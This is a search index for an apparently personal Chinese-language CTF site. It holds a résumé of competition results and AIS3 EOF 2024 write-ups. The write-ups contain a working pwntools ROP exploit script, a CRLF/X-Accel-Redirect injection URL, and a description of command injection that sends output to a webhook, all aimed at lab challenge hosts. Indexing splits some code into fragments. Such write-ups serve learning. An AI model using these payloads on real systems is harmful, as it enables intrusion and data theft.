{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Intro","text":"<p>\u5e0c\u671b\u80fd\u8b8a\u5f97\u66f4\u5f37...</p> <p>\u9006\u5411\u5c08\u9577</p> <p>CTFteam: Starburst Kiwawa &amp; \u7af9\u72d0 (\u65b0 Bamboofox)</p>"},{"location":"#_1","title":"\u4e00\u4e9b\u5c65\u6b77","text":"<ul> <li>\u570b\u7acb\u4e2d\u5c71\u5927\u5b78 \u8cc7\u8a0a\u5de5\u7a0b\u5b78\u7cfb\u5927\u4e8c\u751f</li> <li>\u570b\u7acb\u4e2d\u5c71\u5927\u5b78 \u8cc7\u8a0a\u5b89\u5168\u5be6\u9a57\u5ba4 \u6210\u54e1</li> </ul>"},{"location":"#_2","title":"\u6bd4\u8cfd\u7d93\u6b77\uff1a","text":"<ul> <li>2024 FlareOn11 \u5171\u4e03\u984c \u7b2c 359 \u540d \u53f0\u7063\u7b2c\u4e94\u540d</li> <li>2023 AIS3 Pre-Exam \u7b2c 10 \u540d</li> <li>2023 AIS3 EOF Final \u7b2c 11 \u540d &amp; \u7279\u5225\u734e</li> <li>2024 AIS3 EOF Qual \u7b2c 44 \u540d</li> <li>2024 AIS3 EOF Final \u7b2c 4 \u540d &amp; \u7279\u5225\u734e</li> <li>2023 HITCON CTF Quals \u7b2c 33 \u540d</li> <li>2023 HITCON CTF World Final \u7b2c 8 \u540d</li> <li>2024 HITCON CTF World Final \u81fa\u7063\u4e4b\u661f\uff08\u81fa\u7063\u7b2c\u4e00\u540d\uff09</li> <li>2023 \u4e2d\u5c71\u7814\u7a76\u9662 \u795e\u76fe\u676f \u7b2c 4 \u540d</li> <li>2024 \u4e2d\u5c71\u7814\u7a76\u9662 \u795e\u76fe\u76c3 \u521d\u8cfd \u51a0\u8ecd \u6c7a\u8cfd\u7b2c\u56db\u540d</li> <li>2024 \u5168\u570b\u6280\u80fd\u7af6\u8cfd \u7db2\u8def\u5b89\u5168 \u5357\u5340\u5206\u8cfd \u9280\u724c</li> <li>2024 \u5168\u570b\u6280\u80fd\u7af6\u8cfd \u7db2\u8def\u5b89\u5168 \u5168\u570b\u9280\u724c</li> <li>2024 CDDC Final \u4e16\u754c\u7b2c\u516d\u540d T5SP5+</li> <li>2023 TOPC \u9285\u724c</li> <li>2023 NCPC \u4f73\u4f5c</li> </ul>"},{"location":"#_3","title":"\u53c3\u8207\uff1a","text":"<ul> <li>\u7b2c\u516d\u5c46 \u81fa\u7063\u597d\u53b2\u99ed \u671f\u672b\u767c\u8868 (Galgame \u6f22\u5316\u4e2d\u7684\u9006\u5411)</li> <li>\u7b2c\u4e03\u5c46 \u81fa\u7063\u597d\u53b2\u99ed \u5c0e\u5e2b\u57f9\u8a13 (\u5967\u7fa9\u667a\u6167\u79d1\u6280 CK)</li> <li>\u7b2c\u516b\u5c46 \u81fa\u7063\u597d\u53b2\u99ed \u5c0e\u5e2b\u57f9\u8a13 (TeamT5 Kenny) \u512a\u79c0\u5b78\u54e1\u734e</li> <li>\u7b2c\u516b\u5c46 \u81fa\u7063\u597d\u53b2\u99ed \u671f\u672b\u767c\u8868\uff08\u8b80\u5beb\u8a18\u61b6\u9ad4\u4e2d\u7684\u653b\u8207\u9632\uff09</li> <li>2021 AIS3 \u5de5\u696d\u63a7\u5236\u5b89\u5168\u7d44 (RIPPLE 20)</li> <li>2023 AIS3 \u8edf\u9ad4\u5b89\u5168 (\u904a\u6232\u53cd\u4f5c\u5f0a\u7e5e\u904e)</li> <li>2024 TeamT5 Camp (Intel vt &amp; AMD-V Stealth Hook)</li> <li>2024 GCC Thailand\uff08Maltego Plugin\uff09</li> <li>2024 \u884c\u653f\u9662\u653b\u64ca\u624b</li> <li>2024 AIS3 \u8edf\u9ad4\u5b89\u5168\u52a9\u6559</li> <li>2024 AIS3 Junior \u52a9\u6559</li> </ul>"},{"location":"#_4","title":"\u51fa\u984c\uff1a","text":"<ul> <li>TSC CTF Reverse</li> <li>AIS3 2024 PreExam</li> </ul>"},{"location":"#_5","title":"\u958b\u767c\uff1a","text":"<ul> <li>\u7cbe\u8aa0\u96c6\u5718 YTP \u5c11\u5e74\u5716\u9748\u8a08\u756b2023\u6700\u7d42\u5c08\u984c\u968e\u6bb5\uff08Flutter \u7b46\u8a18\u8edf\u9ad4 \u7d50\u5408\u624b\u5beb\u53ca\u8f38\u5165\uff09</li> <li>2024 \u667a\u6167\u5c08\u6848\u9818\u822a\u8005 AI\u641c\u5c0b code \u8cc7\u8a0a\u4f4d\u7f6e</li> <li>iThome \u9435\u4eba\u8cfd 2022 Rust \u7684\u591a\u65b9\u9762\u61c9\u7528</li> </ul>"},{"location":"#_6","title":"\u6388\u8ab2&amp;\u8b1b\u5ea7\uff1a","text":"<ul> <li>\u81fa\u7063\u597d\u53b2\u5bb3 \u7b2c\u516b\u5c46 \u671f\u672b\u767c\u8868\u6703 \u8a18\u61b6\u9ad4\u8b80\u5beb\u7576\u4e2d\u7684\u653b\u8207\u9632</li> <li>\u81fa\u7063\u597d\u53b2\u99ed \u7b2c\u516d\u5c46 \u671f\u672b\u767c\u8868\u6703 \u6f22\u5316\u904a\u6232\u4e2d\u7684\u9006\u5411</li> <li>\u6210\u529f\u5927\u5b78 &amp; \u4e2d\u6b63\u5927\u5b78 &amp; \u5609\u7fa9\u5927\u5b78 \u8cc7\u5b89\u793e &amp; \u5143\u667a\u5927\u5b78 \u5f9e\u96f6\u958b\u5319 \u904a\u6232\u5916\u639b</li> <li>\u4e2d\u5c71\u5927\u5b78\u8cc7\u5b89\u793e Reverse 101</li> </ul>"},{"location":"#_7","title":"\u6aa2\u5b9a\uff1a","text":"<ul> <li>CPE \u5927\u5b78\u7a0b\u5f0f\u80fd\u529b\u6aa2\u5b9a PR 97</li> <li>TOEIC 825</li> </ul>"},{"location":"#_8","title":"\u5176\u4ed6\uff1a","text":"<ul> <li>Devcore 2023 \u5168\u570b\u734e\u5b78\u91d1</li> <li>112 \u5b78\u5e74\u5ea6 \u666e\u9d3b\u8cc7\u8a0a\u5b89\u5168\u7814\u7a76 \u734e\u5b78\u91d1</li> <li>112 \u5b78\u5e74\u5ea6 \u5c1a\u627f\u79d1\u6280 \u734e\u5b78\u91d1</li> </ul>"},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/","title":"AIS3 EOF Qual 2024 writeup","text":""},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#web","title":"Web","text":""},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#dns-lookup-tool-final","title":"DNS Lookup Tool: Final","text":"<p>\u4e00\u958b\u59cb\u60f3\u8aaa\u7528 `` \u4f86\u505a\u622a\u65b7 \u5f8c\u9762\u767c\u73fe\u5176\u5be6\u53ea\u8981 $()\u62b1\u8457\u5c31\u53ef\u4ee5\u7528\u310c \u7136\u5f8c\u5f8c\u9762\u7528 curl \u5230 webhook \u5728\u5c31\u80fd\u8f38\u6307\u4ee4\u4e86 \u4f46\u5f8c\u9762\u9047\u5230\u4e00\u500b\u60c5\u6cc1\u5c31\u662f\u4ed6\u6307\u4ee4\u7684\u8f38\u51fa\u4e0d\u80fd\u5305\u542b\u7a7a\u683c\u6216\u662f\u63db\u884c \u800c\u4e14 flag \u6587\u4ef6\u4e5f\u4e0d\u53eb flag \u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u4e0a\u50b3\u5230\u5176\u4ed6\u5730\u65b9 \u9019\u6211\u9084\u767cticket \u554fQQ</p> <p>\u6700\u5f8c\u662f\u7528 POST -d \u628a ls \u7684\u6771\u897f\u5f04\u5230 webhook \u4e0a\u5f8c </p> <p>\u518d\u53bb cat flag</p>"},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#internal","title":"Internal","text":"<p>\u6709\u627e\u5230\u4e00\u7bc7 Orange \u7684 writeup https://blog.orange.tw/2014/02/olympic-ctf-2014-curling-200-write-up.html?m=1</p> <p>\u6240\u4ee5\u8f38\u5165<code>http://10.105.0.21:11181/?redir=https://google.com/%0d%0aX-Accel-Redirect:/flag</code></p>"},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#crypto","title":"Crypto","text":""},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#baby-rsa","title":"Baby RSA","text":"<p>\u900f\u904e\u5927\u4e00\u4e0a\u5b78\u671f\u7684\u96e2\u6563\u8ab2\u7a0b \u77e5\u9053\u4e2d\u570b\u9918\u5f0f\u5b9a\u7406\u7684\u7b97\u6cd5</p> <p>\u7136\u5f8c\u5c31\u770b\u4e86\u4e00\u4e0b Edu-Ctf \u7684\u5f71\u7247 \u77e5\u9053\u8aaa\u5982\u679c\u5bc6\u6587\u76f8\u540c\u6709 n1, n2, n3 \u548c c1, c2, c3 \u4fbf\u80fd\u89e3\u51fa\u5bc6\u6587 \u5229\u7528\u4e00\u500b\u53eb\u505a broadcast attack \u7684\u6771\u897f \u5229\u7528 sage \u5c31\u80fd\u89e3\u958b\u4e86 </p>"},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#pwn","title":"Pwn","text":""},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#jackpot","title":"jackpot","text":"<p>\u9996\u5148 \u4ed6\u6703\u5148\u8f38\u5165\u4e00\u500b\u6578\u5b57 \u7136\u5f8c\u90a3\u500b\u6578\u5b57\u53ef\u4ee5\u628a stack \u4e2d\u7684\u6771\u897f\u8f38\u51fa\u51fa\u4f86 \u900f\u904e gdb \u8dd1\u5230\u5b9a\u4f4d\u5f8c \u7136\u5f8c\u8f38\u51fa stack \u627e\u5230 __libc_start_main+2XX</p> <p>\u7136\u5f8c\u5c31\u80fd\u5920\u900f\u904e\u9019\u500b \u53bb\u526a\u6389 0x29d90 \u53bb\u62ff\u5230 libc \u7684 base address</p> <p>\u7136\u5f8c\u5c31\u80fd\u5920\u53bb\u4e32 ROP \u505a ORW \u4e86</p> <p>\u4e0d\u904e\u7531\u65bc\u5b83\u7684\u9577\u5ea6\u9650\u5236 0x100 \u6240\u4ee5\u7576\u521d\u6211\u4fee\u6539\u4e86\u5f88\u4e45\u8b93\u4ed6\u6eff\u8db3\u9577\u5ea6 \u628a\u8a72\u62d4\u7684\u62d4\u6389 \u9084\u6709 flag \u5b57\u4e32\u6709\u51fa\u73fe\u5728\u7a0b\u5f0f\u4e2d\u6240\u4ee5\u6211\u76f4\u63a5\u62ff\u4f86\u4f7f\u7528 \u6700\u5f8c\u5c31\u80fd\u62ff\u5230 flag \u4e86</p> <p>```py= from pwn import * from time import *</p>"},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#contextarchi386-oslinux-log_leveldebug","title":"context(arch='i386', os='linux', log_level='debug')","text":"<p>context(arch = 'amd64', os = 'linux')</p> <p>context.terminal = ['tmux', 'splitw', '-h']</p>"},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#r-remote1721802-1224","title":"r = remote(\"172.18.0.2\", 1224)","text":""},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#r-remote10105021-12978","title":"r = remote(\"10.105.0.21\" ,12978)","text":""},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#r-processjackpot","title":"r = process(\"./jackpot\")","text":"<p>r = remote(\"10.105.0.21\", 12767) lib = ELF(\"./libc.so.6\")</p>"},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#lib-elflibx86_64-linux-gnulibcso6","title":"lib = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")","text":"<p>r.recvuntil(b': ') r.sendline(\"31\") r.recvuntil('ticket') a = int(r.recv(16), 16) print(hex(a))</p>"},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#libc-intrrecvline-1-16-0x29d90","title":"libc = int(r.recvline()[:-1], 16) - 0x29d90","text":""},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#printhexlibc","title":"print(hex(libc))","text":"<p>libc = a - 0x29d90</p>"},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#gdbattachr","title":"gdb.attach(r)","text":"<p>r.recvuntil(\":\")</p> <p>exita = 0x0401120 leave = 0x0401438 bss = 0x0000000000404180</p> <p>pop_rsi = libc + 0x000000000002be51 pop_rdi = libc + 0x000000000002a3e5 pop_rdx = libc + 0x00000000000796a2 flag = 0x040201f</p> <p>sys_write = libc + lib.sym['write'] sys_open = libc + lib.sym['open'] sys_read = libc + lib.sym['read']</p>"},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#gdbattachr_1","title":"gdb.attach(r)","text":"<p>r.sendline(b\"A\" * (0x78) + flat(   pop_rdi, flag,   pop_rsi, 0,   sys_open,   pop_rdi, 3,   pop_rsi, bss + 0x50,   pop_rdx, 0x30,   sys_read,   pop_rdi, 1,   #pop_rsi, bss + 0x50,   sys_write,   leave )) a = r.recvline()</p> <p>print(a)</p>"},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#a-rrecv","title":"a = r.recv()","text":""},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#printa","title":"print(a)","text":"<p>r.interactive()</p> <pre><code>![image](https://hackmd.io/_uploads/ByJ7Myu_6.png)\n\n\n## Reverse\n\n### Flag Generator\n\u6253\u958b\u4e4b\u5f8c\u4ed6\u6703\u628a\u4e00\u500b exe \u7684\u6240\u6709\u8cc7\u6599\u5beb\u5728 memory \u4e2d\u7136\u5f8c\u518d\u522a\u6389\n\u6240\u4ee5\u53ea\u8981\u5728\u4ed6\u522a\u6389\u524d \u628a\u8a18\u61b6\u9ad4\u5167\u5bb9\u5f04\u51fa\u4f86 \u57f7\u884c \u5c31\u80fd\u62ff\u5230 flag \u4e86\n![image](https://hackmd.io/_uploads/HyC5MJOdT.png)\n\n\n### PixelClicker\n\u770b\u5230\u9019\u984c\u6211\u7b2c\u4e00\u500b\u60f3\u5230\u7684\u662f flareOn9 \u7684\u4e00\u984c\n\u7136\u5f8c\u539f\u672c\u4ee5\u70ba\u4ed6\u4e0a\u9762\u5beb\u7684\u662f\u4f4d\u7f6e\u5f8c\u9762\u624d\u767c\u73fe\u539f\u4f86\u662f\u984f\u8272\ndecompile\u5f8c\u4ee5\u70ba\u7167\u4ed6\u4e0a\u9762\u5beb\u7684 \u53ea\u8981\u6309\u5169\u6b21\u5c31\u80fd\u62ff\u5230flag\n\u7136\u5f8c\u767c\u73fe\u5b83\u88e1\u9762\u6709\u4e00\u584a\u6703\u7528\u4f86\u6c7a\u5b9a\u662f\u5426\u7b26\u5408\u7684\u984f\u8272\n![image](https://hackmd.io/_uploads/H11imkdOp.png)\nr9d \u662f\u81ea\u5df1\u7684\u5167\u5bb9\nrax \u662f\u4ed6\u6bd4\u8f03\u7684\u5167\u5bb9\n\u539f\u672c\u5beb\u4e86\u4e00\u500b\u7a0b\u5f0f\u4f86\u6309\u7167\u9806\u5e8f\u8b93\u4ed6\u9ede\u51fa\u6bcf\u6b21\u9ede\u54ea\u500b\u9ede\n\u6a19\u6210\u9ed1\u8272\n\u5f8c\u9762\u767c\u73fe\u5c11\u770b\u4e00\u584acode\n![image](https://hackmd.io/_uploads/BywgEk__p.png)\n\n```py=\n\n\nfrom PIL import Image\n\ndef process_image(input_image_path, output_image_path, color_list_path):\n    # \u8b80\u53d6\u5716\u7247\n    image = Image.open(input_image_path)\n    width, height = 2000, 2000\n\n    # \u8b80\u53d6\u984f\u8272\u5217\u8868\n    with open(\"a.bin\", 'rb') as f:\n        data = f.read()\n\n    print(hex(data[0]))\n    color_list = []\n    print(len(data))\n    for i in range(int(len(data) / 4)):\n        a = [data[4 * i], data[4 * i + 1], data[4*i+2], data[4*i+3]]\n        b = tuple(a)\n        color_list.append(b)\n    # \u5275\u5efa\u4e00\u500b\u65b0\u7684\u5716\u7247\uff0c\u521d\u59cb\u5168\u90e8\u70ba\u767d\u8272\n    new_image = Image.new('RGB', (width, height), 'white')\n    for i in range(0, len(color_list)):\n        a = i % 600 + 0x28a\n        b = int(i / 600)\n        print(a, b)\n        new_image.putpixel(((b, a)), (color_list[i][0], color_list[i][1], color_list[i][2]))\n        #new_image.putpixel((x, y), (0, 0, 0))  # \u6a19\u8a18\u70ba\u9ed1\u8272\n    new_image.save(output_image_path)\n\n    # \u5132\u5b58\u65b0\u7684\u5716\u7247\n\n\nif __name__ == \"__main__\":\n    input_image_path = \"pix.png\"  # \u8f38\u5165\u5716\u7247\u7684\u8def\u5f91\n    output_image_path = \"output_image.jpg\"  # \u8f38\u51fa\u5716\u7247\u7684\u8def\u5f91\n    color_list_path = \"a.txt\"  # \u984f\u8272\u5217\u8868\u7684\u8def\u5f91\n\n    process_image(input_image_path, output_image_path, color_list_path)\n</code></pre> <p>\u7a0b\u5f0f\u5beb\u51fa\u4f86 \u641e\u5b9a </p>"},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#stateful","title":"Stateful","text":"<p>\u4e5f\u8ddf FlareOn9 \u67d0\u984c\u5f88\u50cf \u5c31\u628a\u4ed6\u7684code \u5f04\u51fa\u4f86 \u7136\u5f8c\u5728\u6bcf\u500b\u6703\u5c0d\u5b57\u4e32\u505a\u66f4\u52d5\u7684\u51fd\u6578\u8b93\u4ed6\u8f38\u51fa\u4ed6\u662f\u7b2c\u5e7e\u500b \u767c\u73fe ghidra \u5f04\u51fa\u4f86\u7684\u9806\u5e8f\u5c31\u662f\u4ed6\u57f7\u884c\u7684\u9806\u5e8f \u5171\u670950 \u500b\u51fd\u6578 \u7136\u5f8c\u628a + \u8b8a\u6210 - \u5230\u56de\u53bb\u57f7\u884c\u5c31\u6709\u4e86 \u5de5\u4eba\u667a\u6167\u7684\u52dd\u5229 ```cpp=</p>"},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#include","title":"include  <p>using namespace std;</p> <p>vector param_1; <p>void state_1978986903()</p> <p>{   cout &lt;&lt; 51 &lt;&lt; '\\n';   param_1[5] = param_1[5] - param_1[0x14] - param_1[0x25];   return; }</p> <p>void state_3648003850()</p> <p>{   cout &lt;&lt; 50 &lt;&lt; '\\n';   param_1[8] = param_1[8] - param_1[0x10] - param_1[0xe];   return; }</p> <p>void state_3420754995()</p> <p>{   cout &lt;&lt; 49 &lt;&lt; '\\n';   param_1[0x11] = param_1[0x11] - param_1[0x18] - param_1[0x26];   return; }</p> <p>void state_557589375()</p> <p>{   cout &lt;&lt; 48 &lt;&lt; '\\n';   param_1[0xf] = param_1[0xf] - param_1[8] - param_1[0x28];   return; }</p> <p>void state_71198295()</p> <p>{   cout &lt;&lt; 47 &lt;&lt; '\\n';   param_1[0x25] = param_1[0x25] - param_1[0x10] - param_1[0xc];   return; }</p> <p>void state_126130845()</p> <p>{   cout &lt;&lt; 46 &lt;&lt; '\\n';   param_1[4] = param_1[4] - param_1[0x16] - param_1[6];   return; }</p> <p>void state_3901233957()</p> <p>{   cout &lt;&lt; 45 &lt;&lt; '\\n';   param_1[10] = param_1[10] + (param_1[0x16] + param_1[0xc]);   return; }</p> <p>void state_1843624184()</p> <p>{   cout &lt;&lt; 44 &lt;&lt; '\\n';   param_1[0x12] = param_1[0x12] - param_1[0x1f] - param_1[0x1a];   return; }</p> <p>void state_794507810()</p> <p>{   cout &lt;&lt; 43 &lt;&lt; '\\n';   param_1[0x17] = param_1[0x17] - param_1[0x27] - param_1[0x1e];   return; }</p> <p>void state_4130555047()</p> <p>{   cout &lt;&lt; 42 &lt;&lt; '\\n';   param_1[4] = param_1[4] - param_1[0x19] - param_1[0x1b];   return; }</p> <p>void state_1929982570()</p> <p>{   cout &lt;&lt; 41 &lt;&lt; '\\n';   param_1[0x25] = param_1[0x25] - param_1[0x12] - param_1[0x1b];   return; }</p> <p>void state_3907553856()</p> <p>{   cout &lt;&lt; 40 &lt;&lt; '\\n';   param_1[0x29] = param_1[0x29] + (param_1[0x22] + param_1[3]);   return; }</p> <p>void state_3507844042()</p> <p>{   cout &lt;&lt; 39 &lt;&lt; '\\n';   param_1[0xd] = param_1[0xd] - param_1[8] - param_1[0x1a];   return; }</p> <p>void state_2907124712()</p> <p>{   cout &lt;&lt; 38 &lt;&lt; '\\n';   param_1[2] = param_1[2] - param_1[0x19] - param_1[0x22];   return; }</p> <p>void state_2316743832()</p> <p>{   cout &lt;&lt; 37 &lt;&lt; '\\n';   param_1[0] = param_1[0] - param_1[0x1f] - param_1[0x1c];   return; }</p> <p>void state_1595228866()</p> <p>{   cout &lt;&lt; 36 &lt;&lt; '\\n';   param_1[4] = param_1[4] - param_1[0x19] - param_1[7];   return; }</p> <p>void state_1093244921()</p> <p>{   cout &lt;&lt; 35 &lt;&lt; '\\n';   param_1[0x12] = param_1[0x12] - param_1[0xf] - param_1[0x1d];   return; }</p> <p>void state_809393455()</p> <p>{   cout &lt;&lt; 34 &lt;&lt; '\\n';   param_1[0x15] = param_1[0x15] + (param_1[0x2a] + param_1[0xd]);   return; } void state_1154341356()</p> <p>{   cout &lt;&lt; 33 &lt;&lt; '\\n';   param_1[0x15] = param_1[0x15] - param_1[0xf] - param_1[0x22];   return; }</p> <p>void state_3656605789()</p> <p>{   cout &lt;&lt; 32 &lt;&lt; '\\n';   param_1[7] = param_1[7] - param_1[0] - param_1[10];   return; }</p> <p>void state_4165665722()</p> <p>{   cout &lt;&lt; 31 &lt;&lt; '\\n';   param_1[0xd] = param_1[0xd] - param_1[0x1c] - param_1[0x19];   return; }</p> <p>void state_2816834243()</p> <p>{   cout &lt;&lt; 30 &lt;&lt; '\\n';   param_1[0x20] = param_1[0x20] - param_1[0x19] - param_1[5];   return; }</p> <p>void state_2095151013()</p> <p>{   cout &lt;&lt; 29 &lt;&lt; '\\n';   param_1[0x1f] = param_1[0x1f] - param_1[0x10] - param_1[1];   return; }</p> <p>void state_3908914479()</p> <p>{   cout &lt;&lt; 28 &lt;&lt; '\\n';   param_1[1] = param_1[1] - param_1[0x28] - param_1[0x10];   return; }</p> <p>void state_2309210106()</p> <p>{   cout &lt;&lt; 27 &lt;&lt; '\\n';   param_1[0x1e] = param_1[0x1e] + (param_1[2] + param_1[0xd]);   return; }</p> <p>void state_4008735947()</p> <p>{   cout &lt;&lt; 26 &lt;&lt; '\\n';   param_1[1] = param_1[1] - param_1[6] - param_1[0xf];   return; }</p> <p>void state_3544494813()</p> <p>{   cout &lt;&lt; 25 &lt;&lt; '\\n';   param_1[7] = param_1[7] - param_1[0] - param_1[0x15];   return; }</p> <p>void state_4046605750()</p> <p>{   cout &lt;&lt; 24 &lt;&lt; '\\n';   param_1[0x18] = param_1[0x18] - param_1[5] - param_1[0x14];   return; }</p> <p>void state_1780152111()</p> <p>{   cout &lt;&lt; 23 &lt;&lt; '\\n';   param_1[0x24] = param_1[0x24] - param_1[0xf] - param_1[0xb];   return; }</p> <p>void state_269727185()</p> <p>{   cout &lt;&lt; 22 &lt;&lt; '\\n';   param_1[0] = param_1[0] - param_1[0x10] - param_1[0x21];   return; }</p> <p>void state_4237907356()</p> <p>{   cout &lt;&lt; 21 &lt;&lt; '\\n';   param_1[0x13] = param_1[0x13] - param_1[0x10] - param_1[10];   return; }</p> <p>void state_2098792827()</p> <p>{   cout &lt;&lt; 20 &lt;&lt; '\\n';   param_1[1] = param_1[1] + (param_1[0xd] + param_1[0x1d]);   return; }</p> <p>void state_3443361864()</p> <p>{   cout &lt;&lt; 19 &lt;&lt; '\\n';   param_1[0x1e] = param_1[0x1e] + (param_1[8] + param_1[0x21]);   return; }</p> <p>void state_1132589236()</p> <p>{   cout &lt;&lt; 18 &lt;&lt; '\\n';   param_1[0xf] = param_1[0xf] - param_1[10] - param_1[0x16];   return; }</p> <p>void state_2131447726()</p> <p>{   cout &lt;&lt; 17 &lt;&lt; '\\n';   param_1[0x14] = param_1[0x14] - param_1[0x18] - param_1[0x13];   return; }</p> <p>void state_1765279360()</p> <p>{   cout &lt;&lt; 16 &lt;&lt; '\\n';   param_1[0x1b] = param_1[0x1b] - param_1[0x14] - param_1[0x12];   return; }</p> <p>void state_4026467378()</p> <p>{   cout &lt;&lt; 15 &lt;&lt; '\\n';   param_1[0x27] = param_1[0x27] + (param_1[0x26] + param_1[0x19]);   return; }</p> <p>void state_2202680315()</p> <p>{   cout &lt;&lt; 14 &lt;&lt; '\\n';   param_1[0x17] = param_1[0x17] - param_1[0x22] - param_1[7];   return; }</p> <p>void state_2373489361()</p> <p>{   cout &lt;&lt; 13 &lt;&lt; '\\n';   param_1[0x25] = param_1[0x25] + (param_1[3] + param_1[0x1d]);   return; }</p> <p>void state_416430256()</p> <p>{   cout &lt;&lt; 12 &lt;&lt; '\\n';   param_1[5] = param_1[5] - param_1[4] - param_1[0x28];   return; }</p> <p>void state_2421543205()</p> <p>{   cout &lt;&lt; 11 &lt;&lt; '\\n';   param_1[0x11] = param_1[0x11] - param_1[7] - param_1[0];   return; }</p> <p>void state_3844354947()</p> <p>{   cout &lt;&lt; 10 &lt;&lt; '\\n';   param_1[9] = param_1[9] - param_1[3] - param_1[0xb];   return; }</p> <p>void state_3995931083()</p> <p>{   cout &lt;&lt; 9 &lt;&lt; '\\n';   param_1[0x1f] = param_1[0x1f] - param_1[0x10] - param_1[0x22];   return; }</p> <p>void state_2263885268()</p> <p>{   cout &lt;&lt; 7 &lt;&lt; '\\n';   param_1[0xe] = param_1[0xe] + (param_1[6] + param_1[0x20]);   return; }</p> <p>void state_4260333374()</p> <p>{   cout &lt;&lt; 8 &lt;&lt; '\\n';   param_1[0x10] = param_1[0x10] - param_1[0xb] - param_1[0x19];   return; }</p> <p>void state_1438496410()</p> <p>{   cout &lt;&lt; 5 &lt;&lt; '\\n';   param_1[6] = param_1[6] - param_1[0x29] - param_1[10];   return; }</p> <p>void state_2357240312()</p> <p>{   cout &lt;&lt; 4 &lt;&lt; '\\n';   param_1[2] = param_1[2] - param_1[8] - param_1[0xb];   return; }</p> <p>void state_671274660()</p> <p>{   cout &lt;&lt; 3 &lt;&lt; '\\n';   param_1[0] = param_1[0] + (param_1[0x1f] + param_1[0x12]);   return; }</p> <p>void state_2057902921()</p> <p>{   cout &lt;&lt; 2 &lt;&lt; '\\n';   param_1[9] = param_1[9] + (param_1[0x16] + param_1[2]);   return; }</p> <p>void state_3618225054()</p> <p>{   cout &lt;&lt; 1 &lt;&lt; '\\n';   param_1[0xe] = param_1[0xe] - param_1[8] - param_1[0x23];   return; }</p> <p>int main() {     int a[] = { 0xe1, 0xda, 0xac, 0x33, 0x67, 0x5d, 0xf4, 0x18, 0x0d, 0x42, 0x85, 0x55, 0x5f, 0xc4, 0xb3, 0x81, 0xfb, 0x81, 0x1b, 0x70, 0xdb, 0x34, 0x4c, 0x5d, 0xed, 0x52, 0x5f, 0xf0, 0x74, 0x40, 0x89, 0x56, 0x80, 0x45, 0x53, 0x35, 0xa3, 0xa0, 0x37, 0xdd, 0x33, 0xcc, 0x7d };     for(int i = 0; i &lt; 43; i++)         param_1.push_back(a[i]);     state_1978986903();     state_3648003850();     state_3420754995();     state_557589375();     state_71198295();     state_126130845();     state_3901233957();     state_1843624184();     state_794507810();     state_4130555047();     state_1929982570();     state_3907553856();     state_3507844042();     state_2907124712();     state_2316743832();     state_1595228866();     state_1093244921();     state_809393455();     state_1154341356();     state_3656605789();     state_4165665722();     state_2816834243();     state_2095151013();     state_3908914479();     state_2309210106();     state_4008735947();     state_3544494813();     state_4046605750();     state_1780152111();     state_269727185();     state_4237907356();     state_2098792827();     state_3443361864();     state_1132589236();     state_2131447726();     state_1765279360();     state_4026467378();     state_2202680315();     state_2373489361();     state_416430256();     state_2421543205();     state_3844354947();     state_3995931083();     state_2263885268();     state_4260333374();     state_1438496410();     state_2357240312();     state_671274660();     state_2057902921();     state_3618225054();</p> <pre><code>for(int i = 0; i &lt; 43; i++)\n    cout &lt;&lt; char(param_1[i]) &lt;&lt; ' ';\n</code></pre> <p>} ```</p>","text":""},{"location":"writeup/AIS3-EOF-Qual-2024-writeup/#bam","title":"Bam","text":"<p>\u6c92\u89e3\u51fa\u4f86\u7684 \u62ff source code \u53bb\u505a\u6bd4\u8f03 \u767c\u73fe\u4ed6\u6709\u85cf\u4e00\u500b backdoor  \u7136\u5f8c\u5979\u6703\u62ff\u5b83\u88e1\u9762\u7684\u6771\u897f \\$1337$ \u4f86\u4f5c\u70ba\u6a19\u8a18\u5c0b\u627e \u628a\u5f8c\u9762\u5169\u6bb5\u7528 $ \u5207\u5272\u4e1f\u9032\u53bb \u7136\u5f8c\u4f5c\u4e00\u7cfb\u5217\u64cd\u4f5c\u5f8c\u6703\u5269\u4e0b\u4e00\u500b\u9577\u5ea6\u70ba16 \u7684\u9663\u5217 \u62ff\u4e00\u500b hash \u503c \u8ddf\u4e00\u500b urandom \u51fa\u4f86\u7684\u9663\u5217\u505a xor \u53bb\u6bd4\u8f03\u5982\u679c\u8ddf\u90a3\u500b\u9663\u5217\u4e00\u6a23\u5373\u53ef \u4f46\u6211\u4e0d\u77e5\u9053hash \u8ddf urandom \u7684\u6771\u897f\u600e\u9ebc\u62ff\u51fa\u4f86zzzz</p> <p>\u6211\u597d\u721b\u5594QQ</p>"},{"location":"writeup/AIS3-Pre-Exam-2023-writeup/","title":"AIS3 Pre-Exam 2023 writeup","text":""},{"location":"writeup/AIS3-Pre-Exam-2023-writeup/#simple-reverse","title":"Simple Reverse","text":"<p>https://www.youtube.com/watch?v=Usn6FCXIhvk&amp;t=150s \u6211\u6709\u5370\u8c61\u5beb\u904e\u985e\u4f3c\u984c \u770b\u904e\u4e0a\u9762\u7684\u5f71\u7247 \u60f3\u8aaa\u8907\u7fd2\u4e00\u4e0b angr \u8ddf Z3 \u7d50\u679c\u984c\u76ee\u4e00\u6a21\u4e00\u6a23 \u76f4\u63a5\u7167\u6284 code \u5c31\u89e3\u51fa\u4f86\u4e86 \u9806\u5229\u62ff\u4e0b\u9996\u6bba 